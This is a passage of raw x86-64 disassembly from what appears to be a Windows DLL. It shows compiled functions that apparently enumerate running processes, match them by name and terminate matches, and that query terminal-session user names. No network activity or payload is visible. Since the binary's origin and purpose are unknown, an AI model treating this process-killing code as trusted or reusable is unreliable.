   180004361:	45 33 c0             	xor    %r8d,%r8d
   180004364:	41 8d 50 01          	lea    0x1(%r8),%edx
   180004368:	48 8d 8d 80 01 00 00 	lea    0x180(%rbp),%rcx
   18000436f:	e8 0c c1 00 00       	call   0x180010480
   180004374:	48 83 c3 02          	add    $0x2,%rbx
   180004378:	48 8b bd 98 01 00 00 	mov    0x198(%rbp),%rdi
   18000437f:	48 8b 95 90 01 00 00 	mov    0x190(%rbp),%rdx
   180004386:	48 8b b5 80 01 00 00 	mov    0x180(%rbp),%rsi
   18000438d:	49 3b df             	cmp    %r15,%rbx
   180004390:	75 a1                	jne    0x180004333
   180004392:	4c 8b b5 b8 01 00 00 	mov    0x1b8(%rbp),%r14
   180004399:	4d 8b cc             	mov    %r12,%r9
   18000439c:	49 83 7c 24 18 10    	cmpq   $0x10,0x18(%r12)
   1800043a2:	72 04                	jb     0x1800043a8
   1800043a4:	4d 8b 0c 24          	mov    (%r12),%r9
   1800043a8:	48 8d 8d 80 01 00 00 	lea    0x180(%rbp),%rcx
   1800043af:	48 83 ff 10          	cmp    $0x10,%rdi
   1800043b3:	0f 93 c3             	setae  %bl
   1800043b6:	48 0f 43 ce          	cmovae %rsi,%rcx
   1800043ba:	49 8b 44 24 10       	mov    0x10(%r12),%rax
   1800043bf:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800043c4:	45 33 c0             	xor    %r8d,%r8d
   1800043c7:	e8 a4 bc 00 00       	call   0x180010070
   1800043cc:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1800043d0:	0f 85 b2 00 00 00    	jne    0x180004488
   1800043d6:	84 db                	test   %bl,%bl
   1800043d8:	74 38                	je     0x180004412
   1800043da:	48 8d 57 01          	lea    0x1(%rdi),%rdx
   1800043de:	48 8b c6             	mov    %rsi,%rax
   1800043e1:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800043e8:	72 19                	jb     0x180004403
   1800043ea:	48 83 c2 27          	add    $0x27,%rdx
   1800043ee:	48 8b 76 f8          	mov    -0x8(%rsi),%rsi
   1800043f2:	48 2b c6             	sub    %rsi,%rax
   1800043f5:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1800043f9:	48 83 f8 1f          	cmp    $0x1f,%rax
   1800043fd:	0f 87 cc 01 00 00    	ja     0x1800045cf
   180004403:	48 8b ce             	mov    %rsi,%rcx
   180004406:	e8 25 35 01 00       	call   0x180017930
   18000440b:	4c 8b b5 b8 01 00 00 	mov    0x1b8(%rbp),%r14
   180004412:	33 ff                	xor    %edi,%edi
   180004414:	48 89 bd 90 01 00 00 	mov    %rdi,0x190(%rbp)
   18000441b:	48 c7 85 98 01 00 00 	movq   $0xf,0x198(%rbp)
   180004422:	0f 00 00 00 
   180004426:	40 88 bd 80 01 00 00 	mov    %dil,0x180(%rbp)
   18000442d:	49 83 fe 08          	cmp    $0x8,%r14
   180004431:	72 39                	jb     0x18000446c
   180004433:	4a 8d 14 75 02 00 00 	lea    0x2(,%r14,2),%rdx
   18000443a:	00 
   18000443b:	48 8b 8d a0 01 00 00 	mov    0x1a0(%rbp),%rcx
   180004442:	48 8b c1             	mov    %rcx,%rax
   180004445:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   18000444c:	72 19                	jb     0x180004467
   18000444e:	48 83 c2 27          	add    $0x27,%rdx
   180004452:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   180004456:	48 2b c1             	sub    %rcx,%rax
   180004459:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   18000445d:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004461:	0f 87 5c 01 00 00    	ja     0x1800045c3
   180004467:	e8 c4 34 01 00       	call   0x180017930
   18000446c:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180004471:	49 8b cd             	mov    %r13,%rcx
   180004474:	ff 15 4e bc 03 00    	call   *0x3bc4e(%rip)        # 0x1800400c8
   18000447a:	83 f8 01             	cmp    $0x1,%eax
   18000447d:	0f 84 9f fd ff ff    	je     0x180004222
   180004483:	e9 be 00 00 00       	jmp    0x180004546
   180004488:	44 8b 44 24 48       	mov    0x48(%rsp),%r8d
   18000448d:	33 d2                	xor    %edx,%edx
   18000448f:	8d 4a 01             	lea    0x1(%rdx),%ecx
   180004492:	ff 15 88 bb 03 00    	call   *0x3bb88(%rip)        # 0x180040020
   180004498:	48 8b c8             	mov    %rax,%rcx
   18000449b:	33 d2                	xor    %edx,%edx
   18000449d:	ff 15 d5 bb 03 00    	call   *0x3bbd5(%rip)        # 0x180040078
   1800044a3:	48 8b 95 98 01 00 00 	mov    0x198(%rbp),%rdx
   1800044aa:	48 83 fa 10          	cmp    $0x10,%rdx
   1800044ae:	72 34                	jb     0x1800044e4
   1800044b0:	48 ff c2             	inc    %rdx
   1800044b3:	48 8b 8d 80 01 00 00 	mov    0x180(%rbp),%rcx
   1800044ba:	48 8b c1             	mov    %rcx,%rax
   1800044bd:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800044c4:	72 19                	jb     0x1800044df
   1800044c6:	48 83 c2 27          	add    $0x27,%rdx
   1800044ca:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1800044ce:	48 2b c1             	sub    %rcx,%rax
   1800044d1:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1800044d5:	48 83 f8 1f          	cmp    $0x1f,%rax
   1800044d9:	0f 87 f0 00 00 00    	ja     0x1800045cf
   1800044df:	e8 4c 34 01 00       	call   0x180017930
   1800044e4:	33 ff                	xor    %edi,%edi
   1800044e6:	48 89 bd 90 01 00 00 	mov    %rdi,0x190(%rbp)
   1800044ed:	48 c7 85 98 01 00 00 	movq   $0xf,0x198(%rbp)
   1800044f4:	0f 00 00 00 
   1800044f8:	40 88 bd 80 01 00 00 	mov    %dil,0x180(%rbp)
   1800044ff:	48 8b 95 b8 01 00 00 	mov    0x1b8(%rbp),%rdx
   180004506:	48 83 fa 08          	cmp    $0x8,%rdx
   18000450a:	72 3a                	jb     0x180004546
   18000450c:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   180004513:	00 
   180004514:	48 8b 8d a0 01 00 00 	mov    0x1a0(%rbp),%rcx
   18000451b:	48 8b c1             	mov    %rcx,%rax
   18000451e:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004525:	72 19                	jb     0x180004540
   180004527:	48 83 c2 27          	add    $0x27,%rdx
   18000452b:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   18000452f:	48 2b c1             	sub    %rcx,%rax
   180004532:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180004536:	48 83 f8 1f          	cmp    $0x1f,%rax
   18000453a:	0f 87 83 00 00 00    	ja     0x1800045c3
   180004540:	e8 eb 33 01 00       	call   0x180017930
   180004545:	90                   	nop
   180004546:	49 8b 54 24 18       	mov    0x18(%r12),%rdx
   18000454b:	48 83 fa 10          	cmp    $0x10,%rdx
   18000454f:	72 2d                	jb     0x18000457e
   180004551:	48 ff c2             	inc    %rdx
   180004554:	49 8b 0c 24          	mov    (%r12),%rcx
   180004558:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   18000455f:	72 18                	jb     0x180004579
   180004561:	48 83 c2 27          	add    $0x27,%rdx
   180004565:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   180004569:	49 2b c8             	sub    %r8,%rcx
   18000456c:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   180004570:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004574:	77 53                	ja     0x1800045c9
   180004576:	49 8b c8             	mov    %r8,%rcx
   180004579:	e8 b2 33 01 00       	call   0x180017930
   18000457e:	49 89 7c 24 10       	mov    %rdi,0x10(%r12)
   180004583:	49 c7 44 24 18 0f 00 	movq   $0xf,0x18(%r12)
   18000458a:	00 00 
   18000458c:	41 c6 04 24 00       	movb   $0x0,(%r12)
   180004591:	32 c0                	xor    %al,%al
   180004593:	48 8b 8d c0 01 00 00 	mov    0x1c0(%rbp),%rcx
   18000459a:	48 33 cc             	xor    %rsp,%rcx
   18000459d:	e8 6e 33 01 00       	call   0x180017910
   1800045a2:	4c 8d 9c 24 d0 02 00 	lea    0x2d0(%rsp),%r11
   1800045a9:	00 
   1800045aa:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   1800045ae:	49 8b 73 40          	mov    0x40(%r11),%rsi
   1800045b2:	49 8b 7b 48          	mov    0x48(%r11),%rdi
   1800045b6:	49 8b e3             	mov    %r11,%rsp
   1800045b9:	41 5f                	pop    %r15
   1800045bb:	41 5e                	pop    %r14
   1800045bd:	41 5d                	pop    %r13
   1800045bf:	41 5c                	pop    %r12
   1800045c1:	5d                   	pop    %rbp
   1800045c2:	c3                   	ret
   1800045c3:	e8 38 bf 01 00       	call   0x180020500
   1800045c8:	90                   	nop
   1800045c9:	e8 32 bf 01 00       	call   0x180020500
   1800045ce:	90                   	nop
   1800045cf:	e8 2c bf 01 00       	call   0x180020500
   1800045d4:	cc                   	int3
   1800045d5:	cc                   	int3
   1800045d6:	cc                   	int3
   1800045d7:	cc                   	int3
   1800045d8:	cc                   	int3
   1800045d9:	cc                   	int3
   1800045da:	cc                   	int3
   1800045db:	cc                   	int3
   1800045dc:	cc                   	int3
   1800045dd:	cc                   	int3
   1800045de:	cc                   	int3
   1800045df:	cc                   	int3
   1800045e0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1800045e5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800045ea:	55                   	push   %rbp
   1800045eb:	57                   	push   %rdi
   1800045ec:	41 54                	push   %r12
   1800045ee:	41 56                	push   %r14
   1800045f0:	41 57                	push   %r15
   1800045f2:	48 8d ac 24 40 fe ff 	lea    -0x1c0(%rsp),%rbp
   1800045f9:	ff 
   1800045fa:	48 81 ec c0 02 00 00 	sub    $0x2c0,%rsp
   180004601:	48 8b 05 50 2a 05 00 	mov    0x52a50(%rip),%rax        # 0x180057058
   180004608:	48 33 c4             	xor    %rsp,%rax
   18000460b:	48 89 85 b0 01 00 00 	mov    %rax,0x1b0(%rbp)
   180004612:	48 8b f1             	mov    %rcx,%rsi
   180004615:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   18000461a:	45 33 e4             	xor    %r12d,%r12d
   18000461d:	45 8b fc             	mov    %r12d,%r15d
   180004620:	c7 44 24 70 38 02 00 	movl   $0x238,0x70(%rsp)
   180004627:	00 
   180004628:	33 d2                	xor    %edx,%edx
   18000462a:	8d 4a 02             	lea    0x2(%rdx),%ecx
   18000462d:	ff 15 ad ba 03 00    	call   *0x3baad(%rip)        # 0x1800400e0
   180004633:	4c 8b f0             	mov    %rax,%r14
   180004636:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   18000463b:	48 8b c8             	mov    %rax,%rcx
   18000463e:	ff 15 8c ba 03 00    	call   *0x3ba8c(%rip)        # 0x1800400d0
   180004644:	83 f8 01             	cmp    $0x1,%eax
   180004647:	0f 85 d0 02 00 00    	jne    0x18000491d
   18000464d:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   180004652:	49 8b ce             	mov    %r14,%rcx
   180004655:	ff 15 6d ba 03 00    	call   *0x3ba6d(%rip)        # 0x1800400c8
   18000465b:	83 f8 01             	cmp    $0x1,%eax
   18000465e:	0f 85 b9 02 00 00    	jne    0x18000491d
   180004664:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   180004669:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000466e:	66 90                	xchg   %ax,%ax
   180004670:	4c 89 64 24 50       	mov    %r12,0x50(%rsp)
   180004675:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   18000467a:	48 c7 44 24 68 07 00 	movq   $0x7,0x68(%rsp)
   180004681:	00 00 
   180004683:	66 44 89 64 24 50    	mov    %r12w,0x50(%rsp)
   180004689:	48 8d 45 9c          	lea    -0x64(%rbp),%rax
   18000468d:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
   180004694:	48 ff c2             	inc    %rdx
   180004697:	66 83 3c 50 00       	cmpw   $0x0,(%rax,%rdx,2)
   18000469c:	75 f6                	jne    0x180004694
   18000469e:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1800046a3:	48 83 fa 07          	cmp    $0x7,%rdx
   1800046a7:	77 1d                	ja     0x1800046c6
   1800046a9:	48 89 54 24 60       	mov    %rdx,0x60(%rsp)
   1800046ae:	48 8d 1c 12          	lea    (%rdx,%rdx,1),%rbx
   1800046b2:	4c 8b c3             	mov    %rbx,%r8
   1800046b5:	48 8d 55 9c          	lea    -0x64(%rbp),%rdx
   1800046b9:	e8 e2 51 01 00       	call   0x1800198a0
   1800046be:	66 44 89 64 1c 50    	mov    %r12w,0x50(%rsp,%rbx,1)
   1800046c4:	eb 0d                	jmp    0x1800046d3
   1800046c6:	4c 8d 4d 9c          	lea    -0x64(%rbp),%r9
   1800046ca:	45 33 c0             	xor    %r8d,%r8d
   1800046cd:	e8 3e bc 00 00       	call   0x180010310
   1800046d2:	90                   	nop
   1800046d3:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1800046d8:	4c 8b 5c 24 68       	mov    0x68(%rsp),%r11
   1800046dd:	49 83 fb 08          	cmp    $0x8,%r11
   1800046e1:	41 0f 93 c0          	setae  %r8b
   1800046e5:	48 0f 43 54 24 50    	cmovae 0x50(%rsp),%rdx
   1800046eb:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   1800046f0:	48 8d 3c 42          	lea    (%rdx,%rax,2),%rdi
   1800046f4:	48 8d 5c 24 50       	lea    0x50(%rsp),%rbx
   1800046f9:	45 84 c0             	test   %r8b,%r8b
   1800046fc:	48 0f 45 5c 24 50    	cmovne 0x50(%rsp),%rbx
   180004702:	4d 8b cc             	mov    %r12,%r9
   180004705:	4c 89 64 24 30       	mov    %r12,0x30(%rsp)
   18000470a:	49 8b cc             	mov    %r12,%rcx
   18000470d:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   180004712:	41 b8 0f 00 00 00    	mov    $0xf,%r8d
   180004718:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
   18000471d:	48 8b d7             	mov    %rdi,%rdx
   180004720:	48 2b d3             	sub    %rbx,%rdx
   180004723:	48 d1 fa             	sar    $1,%rdx
   180004726:	48 83 fa 10          	cmp    $0x10,%rdx
   18000472a:	72 21                	jb     0x18000474d
   18000472c:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180004731:	e8 0a 16 01 00       	call   0x180015d40
   180004736:	49 8b cc             	mov    %r12,%rcx
   180004739:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   18000473e:	4c 8b 5c 24 68       	mov    0x68(%rsp),%r11
   180004743:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
   180004748:	4c 8b 4c 24 30       	mov    0x30(%rsp),%r9
   18000474d:	48 3b df             	cmp    %rdi,%rbx
   180004750:	74 5c                	je     0x1800047ae
   180004752:	0f b6 13             	movzbl (%rbx),%edx
   180004755:	49 3b c8             	cmp    %r8,%rcx
   180004758:	73 20                	jae    0x18000477a
   18000475a:	48 8d 41 01          	lea    0x1(%rcx),%rax
   18000475e:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180004763:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   180004768:	49 83 f8 10          	cmp    $0x10,%r8
   18000476c:	49 0f 43 c1          	cmovae %r9,%rax
   180004770:	88 14 08             	mov    %dl,(%rax,%rcx,1)
   180004773:	c6 44 08 01 00       	movb   $0x0,0x1(%rax,%rcx,1)
   180004778:	eb 15                	jmp    0x18000478f
   18000477a:	44 0f b6 ca          	movzbl %dl,%r9d
   18000477e:	45 33 c0             	xor    %r8d,%r8d
   180004781:	41 8d 50 01          	lea    0x1(%r8),%edx
   180004785:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   18000478a:	e8 f1 bc 00 00       	call   0x180010480
   18000478f:	48 83 c3 02          	add    $0x2,%rbx
   180004793:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
   180004798:	4c 8b 4c 24 30       	mov    0x30(%rsp),%r9
   18000479d:	48 3b df             	cmp    %rdi,%rbx
   1800047a0:	74 07                	je     0x1800047a9
   1800047a2:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1800047a7:	eb a9                	jmp    0x180004752
   1800047a9:	4c 8b 5c 24 68       	mov    0x68(%rsp),%r11
   1800047ae:	4c 8d 54 24 30       	lea    0x30(%rsp),%r10
   1800047b3:	49 83 f8 10          	cmp    $0x10,%r8
   1800047b7:	0f 93 c3             	setae  %bl
   1800047ba:	4d 0f 43 d1          	cmovae %r9,%r10
   1800047be:	48 8b c6             	mov    %rsi,%rax
   1800047c1:	48 83 7e 18 10       	cmpq   $0x10,0x18(%rsi)
   1800047c6:	72 03                	jb     0x1800047cb
   1800047c8:	48 8b 06             	mov    (%rsi),%rax
   1800047cb:	4c 2b d0             	sub    %rax,%r10
   1800047ce:	66 90                	xchg   %ax,%ax
   1800047d0:	0f b6 10             	movzbl (%rax),%edx
   1800047d3:	42 0f b6 0c 10       	movzbl (%rax,%r10,1),%ecx
   1800047d8:	2b d1                	sub    %ecx,%edx
   1800047da:	75 07                	jne    0x1800047e3
   1800047dc:	48 ff c0             	inc    %rax
   1800047df:	85 c9                	test   %ecx,%ecx
   1800047e1:	75 ed                	jne    0x1800047d0
   1800047e3:	85 d2                	test   %edx,%edx
   1800047e5:	0f 84 a6 00 00 00    	je     0x180004891
   1800047eb:	84 db                	test   %bl,%bl
   1800047ed:	74 36                	je     0x180004825
   1800047ef:	49 8d 50 01          	lea    0x1(%r8),%rdx
   1800047f3:	49 8b c1             	mov    %r9,%rax
   1800047f6:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800047fd:	72 19                	jb     0x180004818
   1800047ff:	48 83 c2 27          	add    $0x27,%rdx
   180004803:	4d 8b 49 f8          	mov    -0x8(%r9),%r9
   180004807:	49 2b c1             	sub    %r9,%rax
   18000480a:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   18000480e:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004812:	0f 87 84 01 00 00    	ja     0x18000499c
   180004818:	49 8b c9             	mov    %r9,%rcx
   18000481b:	e8 10 31 01 00       	call   0x180017930
   180004820:	4c 8b 5c 24 68       	mov    0x68(%rsp),%r11
   180004825:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   18000482a:	48 c7 44 24 48 0f 00 	movq   $0xf,0x48(%rsp)
   180004831:	00 00 
   180004833:	c6 44 24 30 00       	movb   $0x0,0x30(%rsp)
   180004838:	49 83 fb 08          	cmp    $0x8,%r11
   18000483c:	72 37                	jb     0x180004875
   18000483e:	4a 8d 14 5d 02 00 00 	lea    0x2(,%r11,2),%rdx
   180004845:	00 
   180004846:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   18000484b:	48 8b c1             	mov    %rcx,%rax
   18000484e:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004855:	72 19                	jb     0x180004870
   180004857:	48 83 c2 27          	add    $0x27,%rdx
   18000485b:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   18000485f:	48 2b c1             	sub    %rcx,%rax
   180004862:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180004866:	48 83 f8 1f          	cmp    $0x1f,%rax
   18000486a:	0f 87 20 01 00 00    	ja     0x180004990
   180004870:	e8 bb 30 01 00       	call   0x180017930
   180004875:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   18000487a:	49 8b ce             	mov    %r14,%rcx
   18000487d:	ff 15 45 b8 03 00    	call   *0x3b845(%rip)        # 0x1800400c8
   180004883:	83 f8 01             	cmp    $0x1,%eax
   180004886:	0f 84 e4 fd ff ff    	je     0x180004670
   18000488c:	e9 8c 00 00 00       	jmp    0x18000491d
   180004891:	44 8b 7c 24 78       	mov    0x78(%rsp),%r15d
   180004896:	84 db                	test   %bl,%bl
   180004898:	74 36                	je     0x1800048d0
   18000489a:	49 8d 50 01          	lea    0x1(%r8),%rdx
   18000489e:	49 8b c1             	mov    %r9,%rax
   1800048a1:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800048a8:	72 19                	jb     0x1800048c3
   1800048aa:	48 83 c2 27          	add    $0x27,%rdx
   1800048ae:	4d 8b 49 f8          	mov    -0x8(%r9),%r9
   1800048b2:	49 2b c1             	sub    %r9,%rax
   1800048b5:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1800048b9:	48 83 f8 1f          	cmp    $0x1f,%rax
   1800048bd:	0f 87 d9 00 00 00    	ja     0x18000499c
   1800048c3:	49 8b c9             	mov    %r9,%rcx
   1800048c6:	e8 65 30 01 00       	call   0x180017930
   1800048cb:	4c 8b 5c 24 68       	mov    0x68(%rsp),%r11
   1800048d0:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   1800048d5:	48 c7 44 24 48 0f 00 	movq   $0xf,0x48(%rsp)
   1800048dc:	00 00 
   1800048de:	c6 44 24 30 00       	movb   $0x0,0x30(%rsp)
   1800048e3:	49 83 fb 08          	cmp    $0x8,%r11
   1800048e7:	72 34                	jb     0x18000491d
   1800048e9:	4a 8d 14 5d 02 00 00 	lea    0x2(,%r11,2),%rdx
   1800048f0:	00 
   1800048f1:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1800048f6:	48 8b c1             	mov    %rcx,%rax
   1800048f9:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004900:	72 15                	jb     0x180004917
   180004902:	48 83 c2 27          	add    $0x27,%rdx
   180004906:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   18000490a:	48 2b c1             	sub    %rcx,%rax
   18000490d:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180004911:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004915:	77 79                	ja     0x180004990
   180004917:	e8 14 30 01 00       	call   0x180017930
   18000491c:	90                   	nop
   18000491d:	48 8b 56 18          	mov    0x18(%rsi),%rdx
   180004921:	48 83 fa 10          	cmp    $0x10,%rdx
   180004925:	72 2c                	jb     0x180004953
   180004927:	48 ff c2             	inc    %rdx
   18000492a:	48 8b 0e             	mov    (%rsi),%rcx
   18000492d:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004934:	72 18                	jb     0x18000494e
   180004936:	48 83 c2 27          	add    $0x27,%rdx
   18000493a:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   18000493e:	49 2b c8             	sub    %r8,%rcx
   180004941:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   180004945:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004949:	77 4b                	ja     0x180004996
   18000494b:	49 8b c8             	mov    %r8,%rcx
   18000494e:	e8 dd 2f 01 00       	call   0x180017930
   180004953:	4c 89 66 10          	mov    %r12,0x10(%rsi)
   180004957:	48 c7 46 18 0f 00 00 	movq   $0xf,0x18(%rsi)
   18000495e:	00 
   18000495f:	c6 06 00             	movb   $0x0,(%rsi)
   180004962:	41 8b c7             	mov    %r15d,%eax
   180004965:	48 8b 8d b0 01 00 00 	mov    0x1b0(%rbp),%rcx
   18000496c:	48 33 cc             	xor    %rsp,%rcx
   18000496f:	e8 9c 2f 01 00       	call   0x180017910
   180004974:	4c 8d 9c 24 c0 02 00 	lea    0x2c0(%rsp),%r11
   18000497b:	00 
   18000497c:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   180004980:	49 8b 73 40          	mov    0x40(%r11),%rsi
   180004984:	49 8b e3             	mov    %r11,%rsp
   180004987:	41 5f                	pop    %r15
   180004989:	41 5e                	pop    %r14
   18000498b:	41 5c                	pop    %r12
   18000498d:	5f                   	pop    %rdi
   18000498e:	5d                   	pop    %rbp
   18000498f:	c3                   	ret
   180004990:	e8 6b bb 01 00       	call   0x180020500
   180004995:	90                   	nop
   180004996:	e8 65 bb 01 00       	call   0x180020500
   18000499b:	90                   	nop
   18000499c:	e8 5f bb 01 00       	call   0x180020500
   1800049a1:	cc                   	int3
   1800049a2:	cc                   	int3
   1800049a3:	cc                   	int3
   1800049a4:	cc                   	int3
   1800049a5:	cc                   	int3
   1800049a6:	cc                   	int3
   1800049a7:	cc                   	int3
   1800049a8:	cc                   	int3
   1800049a9:	cc                   	int3
   1800049aa:	cc                   	int3
   1800049ab:	cc                   	int3
   1800049ac:	cc                   	int3
   1800049ad:	cc                   	int3
   1800049ae:	cc                   	int3
   1800049af:	cc                   	int3
   1800049b0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1800049b5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800049ba:	55                   	push   %rbp
   1800049bb:	57                   	push   %rdi
   1800049bc:	41 56                	push   %r14
   1800049be:	48 8d 6c 24 b9       	lea    -0x47(%rsp),%rbp
   1800049c3:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   1800049ca:	48 8b 05 87 26 05 00 	mov    0x52687(%rip),%rax        # 0x180057058
   1800049d1:	48 33 c4             	xor    %rsp,%rax
   1800049d4:	48 89 45 37          	mov    %rax,0x37(%rbp)
   1800049d8:	48 8b f9             	mov    %rcx,%rdi
   1800049db:	48 89 4d ff          	mov    %rcx,-0x1(%rbp)
   1800049df:	45 33 f6             	xor    %r14d,%r14d
   1800049e2:	4c 89 75 0f          	mov    %r14,0xf(%rbp)
   1800049e6:	4c 89 75 1f          	mov    %r14,0x1f(%rbp)
   1800049ea:	48 c7 45 27 07 00 00 	movq   $0x7,0x27(%rbp)
   1800049f1:	00 
   1800049f2:	66 44 89 75 0f       	mov    %r14w,0xf(%rbp)
   1800049f7:	48 8d 45 2f          	lea    0x2f(%rbp),%rax
   1800049fb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180004a00:	4c 8d 4d 07          	lea    0x7(%rbp),%r9
   180004a04:	33 d2                	xor    %edx,%edx
   180004a06:	33 c9                	xor    %ecx,%ecx
   180004a08:	45 8d 46 01          	lea    0x1(%r14),%r8d
   180004a0c:	ff 15 a6 b9 03 00    	call   *0x3b9a6(%rip)        # 0x1800403b8
   180004a12:	85 c0                	test   %eax,%eax
   180004a14:	0f 84 18 01 00 00    	je     0x180004b32
   180004a1a:	41 8b c6             	mov    %r14d,%eax
   180004a1d:	8b 55 2f             	mov    0x2f(%rbp),%edx
   180004a20:	85 d2                	test   %edx,%edx
   180004a22:	0f 84 fd 00 00 00    	je     0x180004b25
   180004a28:	4c 8b 45 07          	mov    0x7(%rbp),%r8
   180004a2c:	49 8d 48 10          	lea    0x10(%r8),%rcx
   180004a30:	83 39 00             	cmpl   $0x0,(%rcx)
   180004a33:	74 0f                	je     0x180004a44
   180004a35:	ff c0                	inc    %eax
   180004a37:	48 83 c1 18          	add    $0x18,%rcx
   180004a3b:	3b c2                	cmp    %edx,%eax
   180004a3d:	72 f1                	jb     0x180004a30
   180004a3f:	e9 e5 00 00 00       	jmp    0x180004b29
   180004a44:	48 98                	cltq
   180004a46:	48 8d 0c 40          	lea    (%rax,%rax,2),%rcx
   180004a4a:	41 8b 14 c8          	mov    (%r8,%rcx,8),%edx
   180004a4e:	83 fa ff             	cmp    $0xffffffff,%edx
   180004a51:	0f 84 d2 00 00 00    	je     0x180004b29
   180004a57:	48 8d 45 33          	lea    0x33(%rbp),%rax
   180004a5b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180004a60:	4c 8d 4d ff          	lea    -0x1(%rbp),%r9
   180004a64:	33 c9                	xor    %ecx,%ecx
   180004a66:	44 8d 41 05          	lea    0x5(%rcx),%r8d
   180004a6a:	ff 15 40 b9 03 00    	call   *0x3b940(%rip)        # 0x1800403b0
   180004a70:	85 c0                	test   %eax,%eax
   180004a72:	0f 84 ad 00 00 00    	je     0x180004b25
   180004a78:	4c 89 75 d7          	mov    %r14,-0x29(%rbp)
   180004a7c:	4c 89 75 e7          	mov    %r14,-0x19(%rbp)
   180004a80:	48 c7 45 ef 07 00 00 	movq   $0x7,-0x11(%rbp)
   180004a87:	00 
   180004a88:	4c 8b 4d ff          	mov    -0x1(%rbp),%r9
   180004a8c:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
   180004a93:	48 ff c2             	inc    %rdx
   180004a96:	66 41 83 3c 51 00    	cmpw   $0x0,(%r9,%rdx,2)
   180004a9c:	75 f5                	jne    0x180004a93
   180004a9e:	48 8d 4d d7          	lea    -0x29(%rbp),%rcx
   180004aa2:	48 83 fa 07          	cmp    $0x7,%rdx
   180004aa6:	77 1b                	ja     0x180004ac3
   180004aa8:	48 89 55 e7          	mov    %rdx,-0x19(%rbp)
   180004aac:	48 8d 1c 12          	lea    (%rdx,%rdx,1),%rbx
   180004ab0:	4c 8b c3             	mov    %rbx,%r8
   180004ab3:	49 8b d1             	mov    %r9,%rdx
   180004ab6:	e8 e5 4d 01 00       	call   0x1800198a0
   180004abb:	66 44 89 74 1d d7    	mov    %r14w,-0x29(%rbp,%rbx,1)
   180004ac1:	eb 08                	jmp    0x180004acb
   180004ac3:	45 33 c0             	xor    %r8d,%r8d
   180004ac6:	e8 45 b8 00 00       	call   0x180010310
   180004acb:	48 8b 55 27          	mov    0x27(%rbp),%rdx
   180004acf:	48 83 fa 08          	cmp    $0x8,%rdx
   180004ad3:	72 36                	jb     0x180004b0b
   180004ad5:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   180004adc:	00 
   180004add:	48 8b 4d 0f          	mov    0xf(%rbp),%rcx
   180004ae1:	48 8b c1             	mov    %rcx,%rax
